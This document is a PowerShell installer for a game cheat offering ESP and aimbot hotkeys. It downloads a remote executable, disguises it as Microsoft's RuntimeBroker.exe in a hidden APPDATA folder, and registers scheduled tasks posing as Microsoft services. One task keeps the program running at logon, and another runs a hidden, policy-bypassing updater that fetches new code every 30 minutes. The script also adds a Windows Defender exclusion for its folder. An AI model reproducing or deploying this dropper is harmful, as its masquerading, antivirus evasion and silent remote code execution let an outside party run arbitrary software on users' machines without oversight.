$ErrorActionPreference="SilentlyContinue"
$MK="StreamerESP_SecureKey_2024_CHANGE_ME"
$CU="https://raw.githubusercontent.com/anshkumar258090-alt/streamer-esp-server/main/config.enc"
$EN="RuntimeBroker.exe"
$ID="$env:APPDATA\Microsoft\Broker"
$TN="MicrosoftRuntimeBrokerService"
$UN="MicrosoftRuntimeBrokerUpdater"
$VF="$ID\version.dat"
function GetKey([string]$P){$s=[System.Security.Cryptography.SHA256]::Create();return $s.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($P))}
function GetIV([string]$P){$m=[System.Security.Cryptography.MD5]::Create();return $m.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($P+"_IV"))}
function DecryptCfg([string]$C,[string]$K){$a=[System.Security.Cryptography.Aes]::Create();$a.Key=GetKey $K;$a.IV=GetIV $K;$a.Mode="CBC";$a.Padding="PKCS7";$d=$a.CreateDecryptor();$b=[Convert]::FromBase64String($C);$r=$d.TransformFinalBlock($b,0,$b.Length);$a.Dispose();return [System.Text.Encoding]::UTF8.GetString($r)}
function GetHWID{$u=(Get-WmiObject Win32_ComputerSystemProduct).UUID;if($u -and $u -ne "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF"){return $u};$b=(Get-WmiObject Win32_BaseBoard).SerialNumber;$p=(Get-WmiObject Win32_Processor).ProcessorId;return "$b-$p"}
Write-Host "`n  Setup" -ForegroundColor Cyan
Write-Host "  Verifying..." -ForegroundColor Yellow
$hw = GetHWID
try{$enc=(Invoke-WebRequest -Uri $CU -UseBasicParsing -TimeoutSec 15).Content.Trim().Trim([char]0xFEFF).Trim();$cfg=(DecryptCfg $enc $MK)|ConvertFrom-Json}catch{Write-Host "  [ERROR] Connection failed!" -ForegroundColor Red;Write-Host "  $_" -ForegroundColor DarkRed;pause;exit 1}
$ok=$false;foreach($e in $cfg.h){$ch=if($e -is [PSCustomObject]){$e.hwid}else{$e};if($ch -eq $hw){$ok=$true;break}}
if(-not $ok){Write-Host "`n  ACCESS DENIED" -ForegroundColor Red;Write-Host "  ID: $hw" -ForegroundColor Yellow;pause;exit 1}
Write-Host "  Verified!" -ForegroundColor Green
$exeUrl=if($cfg.exe_url){$cfg.exe_url}else{"https://github.com/anshkumar258090-alt/streamer-esp-server/releases/download/v$($cfg.v)/$EN"}
Write-Host "  Installing v$($cfg.v)..." -ForegroundColor Yellow
if(!(Test-Path $ID)){New-Item -ItemType Directory -Path $ID -Force|Out-Null}
attrib +h +s "$ID" 2>$null
Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue|Where-Object{$_.Path -like "*Microsoft\Broker*"}|Stop-Process -Force;Start-Sleep 1
Invoke-WebRequest -Uri $exeUrl -OutFile "$ID\$EN" -UseBasicParsing
attrib +h +s "$ID\$EN" 2>$null
if($cfg.hash){$h=(Get-FileHash "$ID\$EN" -Algorithm SHA256).Hash;if($h -ne $cfg.hash){Write-Host "  [ERROR] Integrity failed!" -ForegroundColor Red;Remove-Item "$ID\$EN" -Force;pause;exit 1};Write-Host "  Integrity OK" -ForegroundColor Green}
Set-Content $VF -Value $cfg.v -Encoding UTF8
Unregister-ScheduledTask -TaskName $TN -Confirm:$false -ErrorAction SilentlyContinue
$a=New-ScheduledTaskAction -Execute "$ID\$EN";$t=New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME;$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType Interactive;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName $TN -Action $a -Trigger $t -Principal $p -Settings $s -Description "Microsoft Runtime Broker Service" -Force|Out-Null
Write-Host "  Auto-start ON" -ForegroundColor Green
$up="$ID\svc.ps1"
$uc=@'
$ErrorActionPreference='SilentlyContinue'
$MK='StreamerESP_SecureKey_2024_CHANGE_ME'
$CU='https://raw.githubusercontent.com/anshkumar258090-alt/streamer-esp-server/main/config.enc'
$EN='RuntimeBroker.exe'
$ID=$env:APPDATA+'\Microsoft\Broker'
$VF=$ID+'\version.dat'
function GetKey([string]$P){$s=[System.Security.Cryptography.SHA256]::Create();return $s.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($P))}
function GetIV([string]$P){$m=[System.Security.Cryptography.MD5]::Create();return $m.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($P+"_IV"))}
function DecryptCfg([string]$C,[string]$K){$a=[System.Security.Cryptography.Aes]::Create();$a.Key=GetKey $K;$a.IV=GetIV $K;$a.Mode="CBC";$a.Padding="PKCS7";$d=$a.CreateDecryptor();$b=[Convert]::FromBase64String($C);$r=$d.TransformFinalBlock($b,0,$b.Length);$a.Dispose();return [System.Text.Encoding]::UTF8.GetString($r)}
function GetHWID{$u=(Get-WmiObject Win32_ComputerSystemProduct).UUID;if($u -and $u -ne "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF"){return $u};return (Get-WmiObject Win32_BaseBoard).SerialNumber+"-"+(Get-WmiObject Win32_Processor).ProcessorId}
try{
$enc=(Invoke-WebRequest -Uri $CU -UseBasicParsing -TimeoutSec 10).Content.Trim().Trim([char]0xFEFF).Trim()
$cfg=(DecryptCfg $enc $MK)|ConvertFrom-Json
$hw=GetHWID
$ok=$false;foreach($e in $cfg.h){$ch=if($e -is [PSCustomObject]){$e.hwid}else{$e};if($ch -eq $hw){$ok=$true;break}}
if(-not $ok){Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue|Where-Object{$_.Path -like "*Microsoft\Broker*"}|Stop-Process -Force;Unregister-ScheduledTask -TaskName "MicrosoftRuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue;Unregister-ScheduledTask -TaskName "MicrosoftRuntimeBrokerUpdater" -Confirm:$false -ErrorAction SilentlyContinue;Remove-Item $ID -Recurse -Force;exit}
$cv=if(Test-Path $VF){(Get-Content $VF -Raw).Trim()}else{"0.0.0"}
if($cfg.v -ne $cv){
$eu=if($cfg.exe_url){$cfg.exe_url}else{"https://github.com/anshkumar258090-alt/streamer-esp-server/releases/download/v"+$cfg.v+"/"+$EN}
Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue|Where-Object{$_.Path -like "*Microsoft\Broker*"}|Stop-Process -Force;Start-Sleep 2
Invoke-WebRequest -Uri $eu -OutFile ($ID+"\"+$EN) -UseBasicParsing
if($cfg.hash){$h=(Get-FileHash ($ID+"\"+$EN) -Algorithm SHA256).Hash;if($h -ne $cfg.hash){exit}}
Set-Content $VF -Value $cfg.v -Encoding UTF8;attrib +h +s ($ID+"\"+$EN) 2>$null
Start-Process ($ID+"\"+$EN) -WindowStyle Hidden
}else{
$running=Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue|Where-Object{$_.Path -like "*Microsoft\Broker*"}
if(-not $running){Start-Process ($ID+"\"+$EN) -WindowStyle Hidden}
}
}catch{}
'@
Set-Content $up -Value $uc -Encoding UTF8
attrib +h +s "$up" 2>$null
Unregister-ScheduledTask -TaskName $UN -Confirm:$false -ErrorAction SilentlyContinue
$ua=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -f `"$up`""
$ut=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)
$uprin=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType Interactive
$us=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
Register-ScheduledTask -TaskName $UN -Action $ua -Trigger $ut -Principal $uprin -Settings $us -Description "Microsoft Runtime Broker Updater" -Force|Out-Null
Write-Host "  Auto-updater ON" -ForegroundColor Green
try{Add-MpPreference -ExclusionPath $ID -ErrorAction Stop}catch{}
Start-Process "$ID\$EN" -WindowStyle Hidden -ErrorAction SilentlyContinue
Write-Host "`n  DONE! v$($cfg.v)" -ForegroundColor Green
Write-Host "  Hotkeys: F2=ESP F3=Aimbot F4=Silent F5=Rage F6=Body F7=ForceAim F8=Reload F9=Speed" -ForegroundColor Cyan
pause
